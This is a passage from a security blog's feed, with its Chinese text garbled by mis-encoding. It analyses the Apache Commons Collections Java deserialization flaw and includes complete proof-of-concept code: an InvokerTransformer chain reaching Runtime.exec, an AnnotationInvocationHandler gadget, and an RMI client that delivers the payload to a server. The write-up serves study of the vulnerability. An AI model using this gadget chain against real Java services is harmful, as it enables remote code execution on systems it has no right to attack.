&#125;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡<code>TransformedMap</code>å‡½æ•°è®¾ç½®æˆå‘˜å˜é‡ï¼Œé€šè¿‡è°ƒç”¨<code>put</code>å‡½æ•°ï¼Œè§¦å‘<code>transformValue</code>å‡½æ•°çš„<code>valueTransformer.transform(object)</code>è°ƒç”¨ã€‚<br>pocï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChain</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496893.jpg" alt="-w1270"></p><p>è™½ç„¶æ‰¾åˆ°äº†ä¸€ä¸ªèƒ½è‡ªåŠ¨è°ƒç”¨<code>transform</code>çš„è¿‡ç¨‹ï¼Œä½†æ˜¯è¦å®ç°ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œï¼Œè¿˜éœ€è¦æœ‰å¯¹mapçš„æ“ä½œã€‚è¿™é‡Œè¿˜æœ‰å¦å¤–ä¸€å¤„ä¹Ÿæœ‰è°ƒç”¨<code>transform</code>æ–¹æ³•çš„åŠŸèƒ½ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 168è¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨å…¶çˆ¶ç±»<code>/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java</code>ä¸­å®ç°äº†ä¸€ä¸ªé™æ€ç±»çš„å®šä¹‰ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 180è¡Œ</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = parent.checkSetValue(value); <span class="comment">// è°ƒç”¨ç‚¹</span></span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>è¿™é‡Œç”¨äº†javaç±»çš„åµŒå¥—ï¼Œå’Œphpè¯­è¨€ç‰¹æ€§æœ‰ç‚¹åŒºåˆ«ï¼š<a href="https://blog.csdn.net/hguisu/article/details/7270086" target="_blank" rel="noopener">https://blog.csdn.net/hguisu/article/details/7270086</a></p></blockquote><h3 id="step3-å¯»æ‰¾é‡å†™readObject"><a href="#step3-å¯»æ‰¾é‡å†™readObject" class="headerlink" title="step3: å¯»æ‰¾é‡å†™readObject"></a>step3: å¯»æ‰¾é‡å†™<code>readObject</code></h3><p>åœ¨jdkå°äºç­‰äº1.7çš„æ—¶ï¼Œ<code>/sun/reflect/annotation/AnnotationInvocationHandler.class</code>ä¸­çš„<code>readObject</code>ä¸­æœ‰å¯¹mapçš„ä¿®æ”¹åŠŸèƒ½ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496903.jpg" alt="-w1052"></p><p>è¿™é‡Œä¾¿äºåˆ†æï¼Œç”¨<code>jd-gui</code>å°†å…¶jaråŒ…é€†å‘ï¼š<br><code>/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496915.jpg" alt="-w1435"><br>è¿™é‡Œ<code>readObject</code>æ–¹æ³•ï¼Œä½¿ç”¨äº†<code>entry.setValue</code>æ–¹æ³•ã€‚</p><p>åœ¨æ„é€ æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å°†å®ä¾‹åŒ–ä¼ å…¥çš„å‚æ•°è®¾ä¸ºå…¶æˆå‘˜å˜é‡<code>this.memberValues</code>,æ¥ç€åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œé€šè¿‡å¯¹<code>readObject</code>çš„è°ƒç”¨ï¼Œè§¦å‘<code>MapEntry</code>çš„<code>setValue</code>æ–¹æ³•ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496923.jpg" alt="-w945"></p><p>æœ€åpocç”¨äº†javaåå°„å»å®ä¾‹åŒ–åˆ›å»ºå¯¹è±¡ï¼Œæ„é€ å‡ºä¸€ä¸ªå®Œæ•´çš„æ”»å‡»é“¾ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>); <span class="comment">// æ»¡è¶³/org/apache/commons/collections/map/AbstractMapDecorator.javaçš„nullåˆ¤æ–­,ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆé”®åä¸€å®šè¦æ˜¯valueï¼Œè°ƒäº†å¾ˆå¤šæ¬¡è¿˜æ˜¯æ²¡è§£å†³ï¼Œæ±‚è§£</span></span><br><span class="line"></span><br><span class="line">        Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ è½½ç±»</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–</span></span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); <span class="comment">// è·å–æŒ‡å®šçš„æ„é€ æ–¹æ³•</span></span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);   <span class="comment">//ä¸ºåå°„å¯¹è±¡è®¾ç½®å¯è®¿é—®æ ‡å¿—</span></span><br><span class="line">        Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496933.jpg" alt="-w1125"></p><p>æµç¨‹ï¼šå‚è€ƒseebugçš„ä¸€å¼ å›¾<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496942.jpg" alt="-w1295"></p><h2 id="è¿œç¨‹åˆ©ç”¨å®ç°"><a href="#è¿œç¨‹åˆ©ç”¨å®ç°" class="headerlink" title="è¿œç¨‹åˆ©ç”¨å®ç°"></a>è¿œç¨‹åˆ©ç”¨å®ç°</h2><p>å…ˆå­¦ä¹ å‡ ä¸ªæ¦‚å¿µï¼š</p><ul><li>RMI(Remote Method Invocation)æ˜¯ä¸€ç§åŸºäºåºåˆ—åŒ–Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œä½œä¸ºä¸€ä¸ªå¸¸è§çš„ååºåˆ—åŒ–å…¥å£ï¼Œå’Œååºåˆ—åŒ–æ¼æ´æœ‰å¯†åˆ‡è”ç³»ã€‚åˆ©ç”¨è¿™ç§æœºåˆ¶å¯ä»¥è®©æŸå°æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡åœ¨è°ƒç”¨å¦å¤–ä¸€å°æœåŠ¡å™¨ä¸Šçš„æ–¹æ³•æ—¶ï¼Œå’Œåœ¨æœ¬åœ°æœºä¸Šå¯¹è±¡é—´çš„æ–¹æ³•è°ƒç”¨çš„è¯­æ³•è§„åˆ™ä¸€æ ·ã€‚</li><li>JNDIï¼ˆJava Naming and Directory Interfaceï¼‰ï¼ŒJava å‘½åä¸ç›®å½•æ¥å£ï¼ŒJNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼šDNSã€LDAPã€ CORBAå¯¹è±¡æœåŠ¡ã€RMIç­‰ã€‚<br>(è¿˜æœ‰å¾ˆå¤šæ¦‚å¿µï¼Œå…ˆæŒ–å‘)</li></ul><h3 id="RMIæœåŠ¡ç«¯å®ç°"><a href="#RMIæœåŠ¡ç«¯å®ç°" class="headerlink" title="RMIæœåŠ¡ç«¯å®ç°"></a>RMIæœåŠ¡ç«¯å®ç°</h3><p>æ„é€ ä¸€ä¸ªUseræ¥å£ï¼šUser.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å®ç°Useræ¥å£ï¼šUserImpl.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å®ç°Serverç«¯ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://192.168.43.112:4396/User"</span>;</span><br><span class="line">        User user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">4396</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running :"</span> + url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œç›‘å¬ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496953.jpg" alt="-w993"></p><p>å®¢æˆ·ç«¯UserClient:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://192.168.43.112:4396/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"test"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"test"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496963.jpg" alt="-w1214"></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æœ€åçš„<code>transform</code>å‡½æ•°è°ƒç”¨ä½¿ç”¨äº†<code>jdk1.7</code>åº•å±‚jaråŒ…ï¼Œæ‰€ä»¥åœ¨ä¸åŒçš„jdkç‰ˆæœ¬åˆ©ç”¨é“¾æœ‰æ‰€å·®å¼‚(æŒ–å‘)ï¼ŒåŒæ—¶è¿™ä¸ªæ¼æ´çš„å…³é”®åœ¨äº<code>/org/apache/commons/collections/functors/InvokerTransformer.java</code>å¯ä»¥é€šè¿‡åå°„è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå®˜æ–¹å‘å¸ƒçš„æ–°ç‰ˆæœ¬ä¸­å¢åŠ äº†å¯¹ç›¸å…³åå°„è°ƒç”¨çš„é™åˆ¶ï¼ŒåŒæ—¶å¯¹è¿™äº›ä¸å®‰å…¨çš„Javaç±»çš„åºåˆ—åŒ–æ”¯æŒå¢åŠ äº†å¼€å…³(ä¹Ÿå°±æ˜¯é»‘åå•)ã€‚</p><p>javaé¡¹ç›®å› ä¸ºå…¶å¯ä»¥åŠ è½½å¾ˆå¤šä¾èµ–jaråŒ…ï¼Œå¯¼è‡´å…¶ååºåˆ—åŒ–å¯ä»¥å¯»æ‰¾çš„æ”»å‡»èŒƒå›´å¾ˆå¹¿ï¼Œä»ä¾èµ–æ‰©å±•åˆ°jdkåº“ï¼Œè¿™ä¹Ÿæ˜¯javaæ¯”phpååºåˆ—åŒ–éš¾çš„åœ°æ–¹ã€‚</p><p>æ­¤å¤–ï¼Œç®€å•å­¦ä¹ äº†ä¸€äº›javaè¯­æ³•åå°±å¼€å§‹åˆ†ææ¼æ´ï¼Œå¾ˆå¤šjavaè¯­æ³•ç‰¹æ€§ä»¥åŠæ¦‚å¿µä¸å¤ªç†Ÿæ‚‰ï¼Œæ¯”å¦‚åå°„ã€åµŒå¥—ç±»ã€JMXã€JNDIç­‰ç­‰ï¼Œæ¥ä¸‹æ¥æ‰“ç®—å¥½å¥½å¼¥è¡¥ä¸€ä¸‹è¿™æ–¹é¢çš„çŸ­æ¿ã€‚</p><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></li><li><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></li><li><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CSP:trusted-types åˆä½“éªŒ</title>
    <link href="https://0day.design/2020/01/14/CSPtrusted-types%20%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://0day.design/2020/01/14/CSPtrusted-types åˆä½“éªŒ/</id>
    <published>2020-01-14T12:30:00.000Z</published>
    <updated>2020-03-19T12:47:56.508Z</updated>
    
